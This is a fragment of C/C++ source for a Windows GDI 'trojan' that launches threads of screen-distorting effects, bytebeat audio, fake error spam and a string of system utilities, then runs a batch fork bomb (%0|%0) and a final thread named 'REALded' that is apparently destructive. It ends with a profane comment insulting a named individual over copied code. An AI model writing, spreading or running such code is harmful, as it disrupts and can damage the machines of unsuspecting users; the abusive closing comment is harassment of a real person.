    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
	
		
	thread = CreateThread(0, 0, gdi2, 0, 0, &ID);
	

	Sleep(random() % 10000 + 9000);
    system("azman.msc");
	thread = CreateThread(0, 0, Shake, 0, 0, &ID);
	thread = CreateThread(0, 0, gdi19, 0, 0, &ID);
	
		
	thread = CreateThread(0, 0, gdi3, 0, 0, &ID);

    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
	

	Sleep(random() % 80000 + 7000);
    system("bdechangepin");
	thread = CreateThread(0, 0, Rotate, 0, 0, &ID);
	thread = CreateThread(0, 0, Melter2, 0, 0, &ID);
	thread = CreateThread(0, 0, fun3, 0, 0, &ID);
	
	thread = CreateThread(0, 0, gdi4, 0, 0, &ID);
	thread = CreateThread(0, 0, gdi20, 0, 0, &ID);

    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
	
	
	Reset();
	Bytebeat3();

	Sleep(random() % 10000 + 9000);
    system("certmgr.msc");
	thread = CreateThread(0, 0, Dark2, 0, 0, &ID);
		
	thread = CreateThread(0, 0, gdi5, 0, 0, &ID);

    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
	

	Sleep(random() % 4500 + 3200);
    system("charmap");
	thread = CreateThread(0, 0, Cubes, 0, 0, &ID);
	thread = CreateThread(0, 0, fun4, 0, 0, &ID);
		
	thread = CreateThread(0, 0, gdi6, 0, 0, &ID);

    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
	
	
	Sleep(random() % 24000 + 21000);
    system("choice");
	thread = CreateThread(0, 0, Rainbow, 0, 0, &ID);
		
	thread = CreateThread(0, 0, gdi7, 0, 0, &ID);

    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
	

	Sleep(random() % 4000 + 2700);
    system("bdechangepin");
	thread = CreateThread(0, 0, Flip, 0, 0, &ID);
		
	thread = CreateThread(0, 0, gdi8, 0, 0, &ID);

    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
	

	Sleep(random() % 7500 + 6400);
    system("colorcpl");
	thread = CreateThread(0, 0, Melter3, 0, 0, &ID);
	thread = CreateThread(0, 0, Colors, 0, 0, &ID);
	thread = CreateThread(0, 0, CircleSquare, 0, 0, &ID);
		
	thread = CreateThread(0, 0, gdi9, 0, 0, &ID);
		
	thread = CreateThread(0, 0, gdi12, 0, 0, &ID);
	thread = CreateThread(0, 0, gdi13, 0, 0, &ID);

    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);

	
	Reset();
	Bytebeat4();

	Sleep(random() % 20000 + 1800);
    system("comexp.msc");
	thread = CreateThread(0, 0, Bright, 0, 0, &ID);
	thread = CreateThread(0, 0, ExtremeRotation, 0, 0, &ID);
		
	thread = CreateThread(0, 0, gdi10, 0, 0, &ID);

    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
	
	Reset();
	Bytebeat5();

	Sleep(random() % 17000 + 16000);
    system("compmgmt");
	thread = CreateThread(0, 0, Invert, 0, 0, &ID);
		
	thread = CreateThread(0, 0, gdi11, 0, 0, &ID);
	thread = CreateThread(0, 0, gdi14, 0, 0, &ID);
	thread = CreateThread(0, 0, gdi15, 0, 0, &ID);
	thread = CreateThread(0, 0, gdi16, 0, 0, &ID);
	thread = CreateThread(0, 0, gdi21, 0, 0, &ID);

    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
	

	CloseHandle(thread);

	Sleep(random() % 4000 + 3000);
    system("ComputerDefaults");

    
    thread = CreateThread(0, 0, FakeErrorSpam, 0, 0, &ID);
    
    Sleep(random() % 4000 + 3000);
    system("credwiz");
    // Here is when stuff gets a lil' bit stronger:
    Reset(); // stop bytebeat/""malware" music"
    RipBozo();
    system("./LOL/LOL.html"); // HTML/JS code :000000

    if (reader.GetBoolean("main", "undertalesfx", true)) { // if is true, default is, also true
        mciSendString(L"play ./res/finale.mp3", NULL, 0, NULL);
    }
    
    system("./res/FORK.bat"); // (forkbomb, %0|%0)
    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)REALded, 0, 0, &ID);
    
	//startPayloads();
}

// message for SKIDDERS (aka pankoza and another shitty skidders)
/*
Read the fucking LICENSE part of every file i put (MIT License) instead of
insert every single line of my code into your "new "original" trojan """noskid""""
your fucking son of a bitch.

If you are an motherfucker who dont even whats to read (pankoza), heres an simplified
version of the MIT License:

Fuck the way you gonna use the code, give credits for every part you stole

Follow the license dumbass.
*/